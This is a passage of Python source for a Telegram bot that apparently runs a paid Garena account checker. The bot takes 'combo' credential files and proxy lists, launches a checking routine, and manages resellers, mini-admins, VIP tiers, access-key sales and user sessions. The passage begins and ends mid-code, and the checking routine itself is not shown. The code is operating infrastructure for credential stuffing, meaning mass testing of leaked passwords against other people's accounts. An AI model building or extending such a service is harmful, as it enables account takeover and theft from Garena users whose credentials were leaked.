                await update.message.reply_text(" Only <b>.txt</b> files!",parse_mode=ParseMode.HTML); return
            w=await update.message.reply_text(" Uploading…")
            dest=PROXY_DIR/doc.file_name; tgf=await context.bot.get_file(doc.file_id)
            await tgf.download_to_drive(dest)
            v=i=0
            try:
                with open(dest,"r",encoding="utf-8",errors="ignore") as f:
                    for ln in f:
                        ln=ln.strip()
                        if not ln or ln.startswith("#"): continue
                        c=ln.replace("http://","").replace("https://","").replace("socks5://","").replace("socks4://","")
                        if ":" in c: v+=1
                        else: i+=1
            except: pass
            with sessions_lock:
                if uid in active_sessions: active_sessions[uid]["awaiting_proxy"]=False
            try: await w.delete()
            except: pass
            pf=sorted(PROXY_DIR.glob("*.txt")); fl="\n".join(f"   <code>{p.name}</code>" for p in pf) or "  (none)"
            await update.message.reply_text(
                f" <b>Proxy File Uploaded!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" File    : <code>{doc.file_name}</code>\n Valid   : <code>{v:,}</code> proxies\n"
                f" Skipped : <code>{i:,}</code>\n━━━━━━━━━━━━━━━━━━━━\n<b>All proxy files:</b>\n{fl}",
                parse_mode=ParseMode.HTML)
            return

    allowed,ud,users=await gate(update,context)
    if not allowed: return
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess or sess.get("status") not in ("waiting_file","file_received"):
        await update.message.reply_text("ℹ Use /start → tap <b>Check Accounts</b> first.",parse_mode=ParseMode.HTML); return
    doc=update.message.document
    if not doc or not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text(" Only <b>.txt</b> files!",parse_mode=ParseMode.HTML); return
    if "garena" not in doc.file_name.lower():
        await update.message.reply_text(
            f" <b>Invalid File Name!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Your file must have <b>garena</b> in the filename.\n\n"
            f" <b>Valid Examples:</b>\n"
            f"  • <code>dreigarena.txt</code>\n"
            f"  • <code>zyblahblahgarena.txt</code>\n"
            f"  • <code>garena_combo.txt</code>\n\n"
            f" <b>Rejected:</b> <code>{doc.file_name}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Please rename your file and try again!",
            parse_mode=ParseMode.HTML); return
    # ── 10 MB file size limit (applies to ALL users including VIP) ──────
    FILE_SIZE_LIMIT_MB = 10
    FILE_SIZE_LIMIT_BYTES = FILE_SIZE_LIMIT_MB * 1024 * 1024
    doc_size = doc.file_size or 0
    if doc_size > FILE_SIZE_LIMIT_BYTES:
        size_mb = doc_size / 1024 / 1024
        await update.message.reply_text(
            f" <b>File Too Large!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Your file : <code>{size_mb:.1f} MB</code>\n"
            f" Max allowed: <code>{FILE_SIZE_LIMIT_MB} MB</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Please split your combo file into smaller parts and upload them separately.\n"
            f"This limit applies to all users to ensure the checker can process every line properly.",
            parse_mode=ParseMode.HTML)
        return
    # ── Block new upload if user already has a file ─────────────────────
    uc=COMBO_DIR/uid
    existing_files=list(uc.glob("*.txt")) if uc.exists() else []
    # Also check active session file
    with sessions_lock: cur_sess=active_sessions.get(uid,{})
    cur_file=cur_sess.get("file","")
    has_existing = bool(existing_files) or (cur_file and Path(cur_file).exists())
    if has_existing:
        existing_name=Path(cur_file).name if cur_file and Path(cur_file).exists() else (existing_files[0].name if existing_files else "unknown")
        cur_status=cur_sess.get("status","")
        if cur_status=="checking":
            status_txt=" Currently checking — use /stop first, then /deletefile."
        else:
            status_txt="Tap below to delete it and upload a new one."
        del_kb=InlineKeyboardMarkup([[
            InlineKeyboardButton(" Delete My File",callback_data="user_delete_file")
        ]])
        await update.message.reply_text(
            f" <b>You already have a file!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" <code>{existing_name}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_txt}",
            reply_markup=del_kb if cur_status!="checking" else None,
            parse_mode=ParseMode.HTML)
        return
    uc.mkdir(parents=True,exist_ok=True); dest=uc/doc.file_name
    w=await update.message.reply_text(" Receiving file…")
    if w: track(uid,w.message_id)
    tgf=await context.bot.get_file(doc.file_id); await tgf.download_to_drive(dest)
    try:
        with open(dest,"r",encoding="utf-8",errors="ignore") as f: raw=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("==="))
    except: raw=0
    import contextlib as _cl
    with _cl.redirect_stdout(io.StringIO()), _cl.redirect_stderr(io.StringIO()):
        try: remove_duplicates_from_file(str(dest))
        except: pass
    try:
        with open(dest,"r",encoding="utf-8",errors="ignore") as f: clean=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("==="))
    except: clean=raw
    removed=raw-clean; lim=load_config().get("global_limit")
    with sessions_lock:
        active_sessions[uid]["status"]="file_received"; active_sessions[uid]["file"]=str(dest)
        active_sessions[uid]["stop_event"]=threading.Event(); active_sessions[uid]["chat_id"]=update.message.chat_id
    # Persist immediately on file receive so crash/restart can recover it
    persist_session(uid, {
        "file": str(dest), "chat_id": update.message.chat_id,
        "lvl_key": active_sessions[uid].get("lvl_key","lvl_all"),
        "cf_key":  active_sessions[uid].get("cf_key","cf_both"),
        "username": update.effective_user.username or "",
        "first_name": update.effective_user.first_name or "",
        "status": "file_received",
    })
    dn=f"\n{pe(1)} Removed <code>{removed:,}</code> duplicates" if removed>0 else ""
    ln=f"\n{pe(1)} Limit: first <code>{lim:,}</code> lines only" if lim and lim<clean else ""
    try: await w.delete()
    except: pass
    m2=await update.message.reply_text(
        f"{pe(5)} <b>FILE RECEIVED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} File  : <code>{doc.file_name}</code> {pe(2)}\n"
        f"{pe(2)} Lines : <code>{clean:,}</code>{dn}{ln} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Configure below then tap <b>{BTN_START_NOW}</b>! {pe(3)}",
        reply_markup=kb_settings(uid), parse_mode=ParseMode.HTML)
    if m2: track(uid,m2.message_id)

# ════════════════════════════════════════════
#  ADMIN COMMANDS
# ════════════════════════════════════════════

# ── MINI ADMIN PANEL (moved here to be defined before admin commands) ──
# All admin commands that can be granted to a mini admin
MINI_ADMIN_PERMISSIONS = [
    ("generate_key",     " Generate keys"),
    ("remove_key",       " Remove keys from users"),
    ("ban_user",         " Ban users"),
    ("unban_user",       " Unban users"),
    ("addvip",           " Add VIP"),
    ("removevip",        " Remove VIP"),
    ("checkalluser",     " View all users"),
    ("stats",            " Bot statistics"),
    ("checkrunning",     " View running sessions"),
    ("stopchecking",     " Stop checking sessions"),
    ("continuechecking", " Continue stopped sessions"),
    ("stopall",          " Stop ALL sessions"),
    ("continueall",      " Continue ALL sessions"),
    ("stopforuser",      " Stop/manage one user"),
    ("stopforvip",       " Stop VIP sessions"),
    ("stopnonvip",       " Stop non-VIP sessions"),
    ("checkproxy",       " Check proxy file"),
    ("pasteproxy",       " Paste proxy lines"),
    ("upload_proxy",     " Upload proxy file"),
    ("proxystatus",      " Proxy status"),
    ("removeproxy",      " Remove proxy file"),
    ("refreshcombo",     " Clear combo files"),
    ("refreshresults",   " Clear result files"),
    ("setlimit",         " Set line limit"),
    ("setlimitforvip",   " Set VIP limit"),
    ("setcd",            " Set cooldown"),
    ("setconcurrent",    " Set concurrent slots"),
    ("broadcast",        " Broadcast message"),
    ("lockall",          " Lock/unlock bot"),
    ("refresh",          " Reload config & proxy"),
]
MINI_ADMIN_PERM_MAP = {k: d for k,d in MINI_ADMIN_PERMISSIONS}
MINI_ADMIN_PERM_KEYS = [k for k,_ in MINI_ADMIN_PERMISSIONS]

MINI_ADMINS_FILE = DATA_DIR / "mini_admins.json"

def load_mini_admins() -> dict:
    if MINI_ADMINS_FILE.exists():
        try:
            with open(MINI_ADMINS_FILE,"r",encoding="utf-8") as f: return json.load(f)
        except (json.JSONDecodeError,ValueError):
            log.warning("  mini_admins.json corrupted — returning empty")
    # Legacy: also check old resellers.json
    if RESELLERS_FILE.exists():
        try:
            with open(RESELLERS_FILE,"r",encoding="utf-8") as f:
                old=json.load(f)
            if old:
                log.info("Migrating resellers.json → mini_admins.json")
                with open(MINI_ADMINS_FILE,"w",encoding="utf-8") as f: json.dump(old,f,indent=2)
                return old
        except: pass
    return {}

def save_mini_admins(r: dict):
    with open(MINI_ADMINS_FILE,"w",encoding="utf-8") as f: json.dump(r,f,indent=2)

def is_mini_admin(uid) -> bool:
    ma=load_mini_admins().get(str(uid),{})
    return ma.get("active",False)

def mini_admin_has_perm(uid, perm: str) -> bool:
    ma=load_mini_admins().get(str(uid),{})
    return ma.get("active",False) and perm in ma.get("permissions",[])

def mini_admin_log_action(uid: str, action: str, detail: str = ""):
    """Log any command used by a mini admin."""
    ma=load_mini_admins()
    if uid not in ma: return
    entry={"action":action,"detail":detail,
           "at":datetime.now(timezone.utc).isoformat()}
    ma[uid].setdefault("action_log",[]).append(entry)
    ma[uid]["total_actions"]=ma[uid].get("total_actions",0)+1
    if len(ma[uid]["action_log"])>200:
        ma[uid]["action_log"]=ma[uid]["action_log"][-200:]
    save_mini_admins(ma)

# ── Permission-aware decorator ───────────────────────────────────────────────
def admin_or_mini_admin(perm: str):
    """Decorator: allow full admins OR mini admins who have `perm`."""
    def decorator(fn):
        @wraps(fn)
        async def wrapper(update, context):
            uid_int = update.effective_user.id
            cfg = load_config()
            if is_admin(uid_int, cfg):
                return await fn(update, context)
            uid_str = str(uid_int)
            if mini_admin_has_perm(uid_int, perm):
                mini_admin_log_action(uid_str, perm,
                    " ".join(context.args) if context.args else "")
                return await fn(update, context)
            await update.message.reply_text(
                f" <b>Permission Denied</b>\n"
                f"You need the <code>{perm}</code> permission.\n"
                f"Contact admin for access.",
                parse_mode=ParseMode.HTML)
        return wrapper
    return decorator

# Legacy aliases
RESELLERS_FILE = DATA_DIR / "resellers.json"
def load_resellers(): return load_mini_admins()
def save_resellers(r): save_mini_admins(r)
def is_reseller(uid): return is_mini_admin(uid)
def reseller_has_perm(uid,perm): return mini_admin_has_perm(uid,perm)
def reseller_log_key(uid,key,dtype,dval,max_users,expires_at):
    mini_admin_log_action(uid,"generate_key",
        f"key={key} type={dtype} val={dval} max={max_users}")

# ── End of MINI ADMIN PANEL ──────────────────────────────────────────────────

# ── Admin command functions ──────────────────────────────────────────────────
@admin_or_mini_admin('generate_key')
async def cmd_generate_key(update,context):
    args=context.args or []
    usage=(" <b>Usage:</b>\n<code>/generate_key hours 24 5</code>\n<code>/generate_key days 7 10</code>\n"
           "<code>/generate_key months 1 3</code>\n<code>/generate_key lifetime 5</code>")
    try:
        if not args: raise ValueError
        dt=args[0].lower()
        if dt not in ("hours","days","months","lifetime"): raise ValueError
        if dt=="lifetime":
            if len(args)<2: raise ValueError
            mu=int(args[1]); dv=0
        else:
            if len(args)<3: raise ValueError
            dv=int(args[1]); mu=int(args[2])
            if dv<1: raise ValueError
        if mu<1: raise ValueError
    except: await update.message.reply_text(usage,parse_mode=ParseMode.HTML); return
    exp=compute_expiry(dt,dv)
    key=f"MITZ-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:4].upper()}"
    dd={"hours":f"{dv}h","days":f"{dv}d","months":f"{dv}mo","lifetime":"Lifetime"}[dt]
    keys=load_keys()
    keys[key]={"max_users":mu,"used_by":[],"duration_type":dt,"duration_val":dv,"expires_at":exp,
               "created_at":datetime.now().isoformat(),"created_by":update.effective_user.id}
    save_keys(keys)
    await update.message.reply_text(
        f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Duration : <b>{dd}</b>\n Expires  : {fmt_expiry(exp)}\n Max users: <code>{mu}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('generate_key')
async def cmd_reseller_gen_key(update, context):
    """Reseller version of /generate_key — same logic, accessible via /rgenkey."""
    args = context.args or []
    usage = (" <b>Usage:</b>\n<code>/rgenkey hours 24 5</code>\n<code>/rgenkey days 7 10</code>\n"
             "<code>/rgenkey months 1 3</code>\n<code>/rgenkey lifetime 5</code>")
    try:
        if not args: raise ValueError
        dt = args[0].lower()
        if dt not in ("hours", "days", "months", "lifetime"): raise ValueError
        if dt == "lifetime":
            if len(args) < 2: raise ValueError
            mu = int(args[1]); dv = 0
        else:
            if len(args) < 3: raise ValueError
            dv = int(args[1]); mu = int(args[2])
            if dv < 1: raise ValueError
        if mu < 1: raise ValueError
    except:
        await update.message.reply_text(usage, parse_mode=ParseMode.HTML); return
    exp = compute_expiry(dt, dv)
    key = f"MITZ-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:4].upper()}"
    dd = {"hours": f"{dv}h", "days": f"{dv}d", "months": f"{dv}mo", "lifetime": "Lifetime"}[dt]
    keys = load_keys()
    keys[key] = {"max_users": mu, "used_by": [], "duration_type": dt, "duration_val": dv,
                 "expires_at": exp, "created_at": datetime.now().isoformat(),
                 "created_by": update.effective_user.id}
    save_keys(keys)
    uid_str = str(update.effective_user.id)
    reseller_log_key(uid_str, key, dt, dv, mu, exp)
    await update.message.reply_text(
        f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Duration : <b>{dd}</b>\n Expires  : {fmt_expiry(exp)}\n Max users: <code>{mu}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('remove_key')
async def cmd_remove_key(update,context):
    if not context.args:
        await update.message.reply_text("Usage:\n<code>/remove_key &lt;user_id&gt;</code>\n<code>/remove_key all</code>  — all users\n<code>/remove_key vip</code>  — VIP only\n<code>/remove_key nonvip</code>  — non-VIP only",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip().lower(); users=load_users()
    if t in ("all","vip","nonvip"):
        cnt=0
        for uid2 in list(users.keys()):
            u2=users[uid2]
            is_vip=u2.get("vip",False)
            is_active=u2.get("activated",False)
            # Determine if this user matches the filter
            if t=="all" and is_active: match=True
            elif t=="vip" and is_active and is_vip: match=True
            elif t=="nonvip" and is_active and not is_vip: match=True
            else: match=False
            if match:
                users[uid2].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt+=1
                with sessions_lock:
                    if uid2 in active_sessions: active_sessions[uid2].get("stop_event",threading.Event()).set()
                try: await context.bot.send_message(chat_id=int(uid2),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                except: pass
        save_users(users)
        label={"all":"All","vip":"VIP only","nonvip":"Non-VIP only"}[t]
        await update.message.reply_text(f" <b>Keys Removed ({label})!</b>\nRevoked <code>{cnt}</code> user(s).",parse_mode=ParseMode.HTML); return
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    was=users[t].get("activated",False)
    users[t].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); save_users(users)
    with sessions_lock:
        if t in active_sessions: active_sessions[t].get("stop_event",threading.Event()).set()
    try: await context.bot.send_message(chat_id=int(t),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
    except: pass
    await update.message.reply_text(f" <b>Key Removed</b>\n🆔 <code>{t}</code> @{users[t].get('username','?')}\nWas active: {'yes' if was else 'no'}",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('ban_user')
async def cmd_ban_user(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/ban_user &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); ud,users=get_or_create_user(t,"","")
    if ud.get("banned"): await update.message.reply_text(f"ℹ <code>{t}</code> already banned.",parse_mode=ParseMode.HTML); return
    users[t]["banned"]=True; save_users(users)
    with sessions_lock:
        if t in active_sessions: active_sessions[t].get("stop_event",threading.Event()).set()
    await update.message.reply_text(f" Banned: <code>{t}</code> @{users[t].get('username','?')}",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('unban_user')
async def cmd_unban_user(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/unban_user &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); users=load_users()
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    users[t]["banned"]=False; save_users(users)
    await update.message.reply_text(f" Unbanned: <code>{t}</code>",parse_mode=ParseMode.HTML)

# ── Continue/stop helpers ──────────────────────────────────────────────────
def _stop_user_session(uid2: str, bot, loop, reason_text: str) -> bool:
    """Force-stop a user's checking session. Returns True if was checking."""
    with sessions_lock:
        s = active_sessions.get(uid2, {})
        if s.get("status") != "checking":
            return False
        s["stop_event"].set()
        _admin_stopped.add(uid2)
        cid2 = s.get("chat_id")
    if cid2 and bot and loop:
        try:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=cid2, parse_mode=ParseMode.HTML,
                                 text=reason_text), loop)
        except: pass
    return True


def _continue_user_session(uid2: str, bot, loop, context) -> bool:
    """Re-queue a user session that was admin-stopped. Returns True if continued."""
    with sessions_lock:
        s = active_sessions.get(uid2, {})
        if uid2 not in _admin_stopped: return False
        if s.get("status") == "checking": return False   # already running
        _admin_stopped.discard(uid2)
    # Re-trigger their session the same way auto-resume does
    fpath = s.get("file","")
    if not fpath or not Path(fpath).exists(): return False
    cid2 = s.get("chat_id")
    if not cid2: return False
    # Send resume message and restart bg thread
    if bot and loop:
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=cid2, parse_mode=ParseMode.HTML,
                text=" <b>Session Continued!</b>\nAdmin has resumed your session."), loop)
    # Set a fresh stop_event and mark checking again
    new_stop = threading.Event()
    with sessions_lock:
        active_sessions[uid2]["stop_event"] = new_stop
        active_sessions[uid2]["status"] = "checking"
    # Fire background thread
    combo = Path(fpath)
    rf = Path(s.get("result_folder", str(RESULTS_DIR/uid2/datetime.now().strftime("%Y%m%d_%H%M%S"))))
    rf.mkdir(parents=True, exist_ok=True)
    cfg2 = load_config(); users2 = load_users()
    isv2 = users2.get(uid2,{}).get("vip",False)
    lim2 = cfg2.get("vip_limit") if isv2 else cfg2.get("global_limit")
    thr2 = cfg2.get("default_threads", 5)
    def _bg2():
        _enqueue(uid2); _checker_semaphore.acquire(); _dequeue(uid2)
        with sessions_lock:
            if active_sessions.get(uid2,{}).get("status") != "checking" or new_stop.is_set():
                _checker_semaphore.release(); return
        stats2 = run_checker(uid2, str(combo), rf, lim2, thr2, new_stop,
                              cfg2["bot_token"], int(cid2),
                              [s.get("lvl_key","lvl_all")], s.get("cf_key","cf_both"),
                              is_resume=True)
        _checker_semaphore.release()
        with sessions_lock:
            if uid2 in active_sessions: active_sessions[uid2]["status"] = "done"
        if bot and loop:
            asyncio.run_coroutine_threadsafe(
                deliver_results(bot, int(cid2), uid2,
                    list(rf.glob("*.zip")) or None, stats2,
                    combo_file=str(combo)), loop)
    threading.Thread(target=_bg2, daemon=True, name=f"bg-cont-{uid2}").start()
    return True


@admin_only
async def cmd_stop_all_checking(update, context):
    """Stop ALL users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, s in running:
        if _stop_user_session(uid2, context.bot, loop,
            " <b>Admin stopped your session.</b>\nYour file is safe — an admin can resume it."):
            uname = users_db.get(uid2,{}).get("username","?")
            stopped.append(f"<code>{uid2}</code> @{uname}")
    if not stopped:
        await update.message.reply_text(" No active sessions to stop.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue All", callback_data="admin_continue_all")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped),
        reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_continue_all_checking(update, context):
    """Continue ALL admin-stopped sessions."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); continued = []
    for uid2 in list(_admin_stopped):
        if _continue_user_session(uid2, context.bot, loop, context):
            uname = users_db.get(uid2,{}).get("username","?")
            continued.append(f"<code>{uid2}</code> @{uname}")
    if not continued:
        await update.message.reply_text(" No stopped sessions to continue.", parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f" <b>Continued {len(continued)} session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(continued), parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_vip(update, context):
    """Stop all VIP users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, _ in running:
        if users_db.get(uid2,{}).get("vip"):
            if _stop_user_session(uid2, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe."):
                stopped.append(f"<code>{uid2}</code> @{users_db.get(uid2,{}).get('username','?')}")
    if not stopped:
        await update.message.reply_text(" No VIP sessions running.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue VIP", callback_data="admin_continue_vip")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} VIP session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped), reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_nonvip(update, context):
    """Stop all non-VIP users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, _ in running:
        if not users_db.get(uid2,{}).get("vip") and not is_admin(int(uid2), load_config()):
            if _stop_user_session(uid2, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe."):
                stopped.append(f"<code>{uid2}</code> @{users_db.get(uid2,{}).get('username','?')}")
    if not stopped:
        await update.message.reply_text(" No non-VIP sessions running.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue Non-VIP", callback_data="admin_continue_nonvip")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} non-VIP session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped), reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_user(update, context):
    """Show running sessions as buttons to stop/continue one user.
    Usage: /stopforuser  — shows all running with buttons
           /stopforuser <uid>  — stop specific user directly
    """
    loop = asyncio.get_event_loop()
    users_db = load_users()

    # Direct stop by uid
    if context.args:
        target = context.args[0].strip()
        s = active_sessions.get(target, {})
        if s.get("status") == "checking":
            _stop_user_session(target, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe.")
            uname = users_db.get(target,{}).get("username","?")
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton(" Continue", callback_data=f"admin_cont_user_{target}")
            ]])
            await update.message.reply_text(
                f" Stopped <code>{target}</code> @{uname}",
                reply_markup=kb, parse_mode=ParseMode.HTML)
        elif target in _admin_stopped:
            _continue_user_session(target, context.bot, loop, context)
            uname = users_db.get(target,{}).get("username","?")
            await update.message.reply_text(
                f" Continued <code>{target}</code> @{uname}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                f" <code>{target}</code> is not currently checking.", parse_mode=ParseMode.HTML)
        return

    # Show all running sessions with stop/continue buttons
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    paused = list(_admin_stopped)

    if not running and not paused:
        await update.message.reply_text(" No active or paused sessions.", parse_mode=ParseMode.HTML); return

    lines = [" <b>Sessions</b>\n━━━━━━━━━━━━━━━━━━━━"]
    btns = []
    for uid2, s in running:
        udata = users_db.get(uid2, {})
        uname = udata.get("username","?"); fname = udata.get("first_name","?")
        vip = "" if udata.get("vip") else ""
        ls2 = s.get("live_stats"); st2 = ls2.get_stats() if ls2 else {}
        lines.append(f"{vip} <b>{fname}</b> @{uname} (<code>{uid2}</code>) {st2.get('has_codm',0)}")
        btns.append([InlineKeyboardButton(
            f" Stop {fname} @{uname}", callback_data=f"admin_stop_user_{uid2}")])

    for uid2 in paused:
        udata = users_db.get(uid2, {})
        uname = udata.get("username","?"); fname = udata.get("first_name","?")
        lines.append(f" <b>{fname}</b> @{uname} (<code>{uid2}</code>) — paused by admin")
        btns.append([InlineKeyboardButton(
            f" Continue {fname} @{uname}", callback_data=f"admin_cont_user_{uid2}")])

    btns.append([
        InlineKeyboardButton(" Stop All",     callback_data="admin_stop_all"),
        InlineKeyboardButton(" Continue All", callback_data="admin_continue_all"),
    ])
    await update.message.reply_text(
        "\n".join(lines), reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)


@admin_only
async def cmd_lock_all(update,context):
    cfg=load_config(); cfg["locked"]=True; save_config(cfg)
    users=load_users(); stopped=0
    with sessions_lock:
        for uid2,s in active_sessions.items():
            if s.get("status")=="checking" and not users.get(uid2,{}).get("vip"):
                s["stop_event"].set(); stopped+=1
                # Notify the affected user
                cid2=s.get("chat_id")
                if cid2:
                    try:
                        asyncio.get_event_loop().create_task(
                            update.get_bot().send_message(
                                chat_id=cid2,parse_mode=ParseMode.HTML,
                                text=" <b>Bot has been locked by admin.</b>\n"
                                     "Your session was paused. Your file is safe — "
                                     "it will resume when the bot is unlocked."))
                    except: pass
    await update.message.reply_text(
        f" <b>Bot Locked!</b> Paused <code>{stopped}</code> session(s).\n"
        f"Files are kept — users can resume after /unlockAll.",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_unlock_all(update,context):
    cfg=load_config(); cfg["locked"]=False; save_config(cfg)
    await update.message.reply_text(" <b>Bot Unlocked!</b>",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('addvip')
async def cmd_add_vip(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/addvip &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); ud,users=get_or_create_user(t,"","")
    ud["vip"]=True; ud["activated"]=True; save_users(users)
    await update.message.reply_text(f" VIP granted: <code>{t}</code>",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('removevip')
async def cmd_remove_vip(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/removevip &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); users=load_users()
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    users[t]["vip"]=False; save_users(users)
    await update.message.reply_text(f" VIP removed: <code>{t}</code>",parse_mode=ParseMode.HTML)

@admin_only
async def cmd_mini_admin_panel(update, context):
    """/miniadminpanel <user_id> [perm1 perm2 ...] — Add/update a Mini Admin"""
    tg=update.effective_user

    if len(context.args) < 1:
        perm_list="\n".join(f"  <code>{k}</code> — {d}" for k,d in MINI_ADMIN_PERMISSIONS)
        await update.message.reply_text(
            f" <b>Mini Admin Panel</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Usage: <code>/miniadminpanel &lt;user_id&gt; [perm1 perm2 ...]</code>\n\n"
            f" <b>Available Permissions:</b>\n{perm_list}\n\n"
            f"Example:\n<code>/miniadminpanel 123456789 generate_key ban_user stats</code>\n\n"
            f"Leave permissions blank to keep existing ones.\n"
            f"Use /miniadminlist to see all mini admins.\n"
            f"Use /removeminiadmin &lt;uid&gt; to revoke.",
            parse_mode=ParseMode.HTML); return

    target_uid=context.args[0].strip()
    raw_perms=[p.strip().lower() for p in context.args[1:]]
    valid_perms=[p for p in raw_perms if p in MINI_ADMIN_PERM_KEYS]
    bad_perms=[p for p in raw_perms if p not in MINI_ADMIN_PERM_KEYS]

    ma=load_mini_admins()
    users_db=load_users(); udata=users_db.get(target_uid,{})
    uname_r=udata.get("username","?"); fname_r=udata.get("first_name","?")
    existing=ma.get(target_uid,{})
    final_perms=valid_perms if valid_perms else existing.get("permissions",[])
    ma[target_uid]={
        "added_by":tg.id,
        "added_at":existing.get("added_at",datetime.now(timezone.utc).isoformat()),
        "updated_at":datetime.now(timezone.utc).isoformat(),
        "username":uname_r,"first_name":fname_r,
        "permissions":final_perms,"active":True,
        "total_actions":existing.get("total_actions",0),
        "action_log":existing.get("action_log",[]),
    }
    save_mini_admins(ma)

    perms_str="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                          for p in final_perms) or "   None"
    warn_str=(f"\n Unknown perms ignored: <code>{', '.join(bad_perms)}</code>" if bad_perms else "")
    await update.message.reply_text(
        f" <b>Mini Admin Added!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Name : <b>{fname_r}</b> @{uname_r}\n🆔 ID   : <code>{target_uid}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n <b>Granted Permissions:</b>\n{perms_str}{warn_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\nThey can now use all granted commands directly.",
        parse_mode=ParseMode.HTML)

    # Build personalized command menu
    base_cmds=[
        BotCommand("start"," Start / Home"),BotCommand("redeem"," Redeem a key"),
        BotCommand("check"," Check progress"),BotCommand("stop"," Stop checking"),
        BotCommand("status","ℹ Session status"),BotCommand("myresultsfile"," Get current results file"),
        BotCommand("deletefile"," Delete combo file"),
        BotCommand("clean"," Clean combo file"),BotCommand("cancel"," Cancel session"),
        BotCommand("miniadminpanel"," Mini Admin panel"),
    ]
    perm_to_cmd={k:k for k,_ in MINI_ADMIN_PERMISSIONS}
    perm_to_cmd["generate_key"]="generate_key"; perm_to_cmd["upload_proxy"]="upload_proxy"
    extra_cmds=[BotCommand(perm_to_cmd[p],MINI_ADMIN_PERM_MAP[p])
